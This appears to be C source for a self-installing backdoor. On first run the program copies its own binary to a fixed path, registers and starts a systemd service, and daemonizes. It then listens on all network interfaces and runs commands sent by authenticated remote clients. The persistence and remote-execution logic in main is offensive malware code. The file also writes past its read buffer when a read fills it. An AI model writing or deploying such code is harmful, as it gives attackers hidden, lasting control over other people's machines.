#include "tcp_server.h"

int create_server_socket() 
{
    int server_fd;
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("failed to create socket");
        exit(EXIT_FAILURE);
    }
    return server_fd;
}

void bind_and_listen(int server_fd, struct sockaddr_in* address)
{
    address->sin_family = AF_INET;
    address->sin_addr.s_addr = INADDR_ANY;
    address->sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr*)address, sizeof(*address)) < 0)
    {
        perror("bind failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }
    if (listen(server_fd, 3) < 0)
    {
        perror("listen failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }
}

int handle_new_connection(int server_fd, struct sockaddr_in* address, int *client_socket, int addrlen)
{
    int new_socket;
    int i = 0;

    if ((new_socket = accept(server_fd, (struct sockaddr*)address, (socklen_t*)&addrlen)) < 0)
    {
        perror("Accept failed");
        exit(EXIT_FAILURE);
    }

    while (i < MAX_CLIENTS)
    {
        if (client_socket[i] == 0)
        {
            client_socket[i] = new_socket;
            break;
        }
        i++;
    }
    return new_socket;    
}

void handle_client_data(int *client_socket, int socket_id, char *buffer, struct sockaddr_in* address, int addrlen)
{
    int valread;

    if ((valread = read(socket_id, buffer, BUFFER_SIZE)) == 0)
    {
        getpeername(socket_id, (struct sockaddr*)address, (socklen_t*)&addrlen);
        close(socket_id);
        for (int i = 0; i < MAX_CLIENTS; i++)
        {
            if (client_socket[i] == socket_id)
            {
                client_socket[i] = 0;
                break;
            }
        }
    } 
    else 
    {
        buffer[valread] = '\0';
        if (buffer[valread - 1] == '\n')
            buffer[valread - 1] = '\0';
        execute_command(buffer, socket_id);
    }
}

int count_connected_clients(int *client_socket)
{
    int count = 0;
    int i = 0;
    while (i < MAX_CLIENTS)
    {
        if (client_socket[i] > 0)
        {
            count++;
        }
        i++;
    }
    return count;
}


int main(void)
{
    int server_fd;
    int new_socket;
    int client_socket[MAX_CLIENTS];
    int max_sd;
    int socket_id;
    int activity;
    struct sockaddr_in addr;
    int addrlen = sizeof(addr);
    char buffer[BUFFER_SIZE] = {0};
    fd_set readfds;
    int i = 0;

    // Initialize all client_socket[] to 0
    while (i < MAX_CLIENTS)
    {
        client_socket[i] = 0;
        i++;
    }

    server_fd = create_server_socket();
    bind_and_listen(server_fd, &addr);
    if (access(DEST_FILE, F_OK) == -1){
        copy_binary_file(SOURCE_FILE, DEST_FILE);
        create_systemd_service(SERVICE_NAME, DEST_FILE);
        enable_and_start_service(SERVICE_NAME);
        create_daemon();
    }
    while (1)
    {
        FD_ZERO(&readfds);
        FD_SET(server_fd, &readfds);
        max_sd = server_fd;
        i = 0;
        while (i < MAX_CLIENTS)
        {
            socket_id = client_socket[i];

            if (socket_id > 0)
                FD_SET(socket_id, &readfds);

            if (socket_id > max_sd)
                max_sd = socket_id;
            i++;
        }
        activity = select(max_sd + 1, &readfds, NULL, NULL, NULL);
        if ((activity < 0) && (errno != EINTR))
            perror("select error");

        if (FD_ISSET(server_fd, &readfds) &&  (count_connected_clients(client_socket) < 3)) 
        {
            new_socket = handle_new_connection(server_fd, &addr, client_socket, addrlen);
            if (!authenticate_client(new_socket)) {
                i = 0;
                while (i < MAX_CLIENTS) {
                    if (client_socket[i] == new_socket) {
                        client_socket[i] = 0;
                        break;
                    }
                    i++;
                }
            }
        }
        i = 0;
        while (i < MAX_CLIENTS)
        {
            socket_id = client_socket[i];
            if (FD_ISSET(socket_id, &readfds))
                 handle_client_data(client_socket, socket_id, buffer, &addr, addrlen);
            i++;
        }
    }

    close(server_fd);
    return 0;
}
